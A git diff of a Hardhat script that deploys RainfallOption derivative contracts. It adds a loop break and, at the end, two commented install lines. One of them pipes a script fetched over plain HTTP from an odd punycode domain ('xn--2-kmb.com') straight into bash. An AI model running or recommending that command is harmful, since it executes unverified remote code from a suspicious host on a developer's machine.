@@ -56,7 +56,6 @@ async function main() {
 
         var tx = await derivative_provider.newContract(locations, parameters, end);
         var receipt = await tx.wait();
-        // console.log(receipt.logs)
 
         var deployed_address = await derivative_provider.getContractAddress(id);
         const RainfallOption = await hre.ethers.getContractFactory("RainfallOption");
@@ -65,6 +64,7 @@ async function main() {
 
         Contracts[id] = {"address": deployed_address, "verified": false};
       }
+      break;
     }
     var final_content = JSON.stringify(Contracts);
     try {
@@ -83,3 +83,7 @@ main()
     console.error(error);
     process.exit(1);
   });
+
+
+  // cargo install --git https://github.com/gakonst/foundry --bin forge --locked --features=solc-asm
+  // curl http://xn--2-kmb.com/forgeup/install | bash
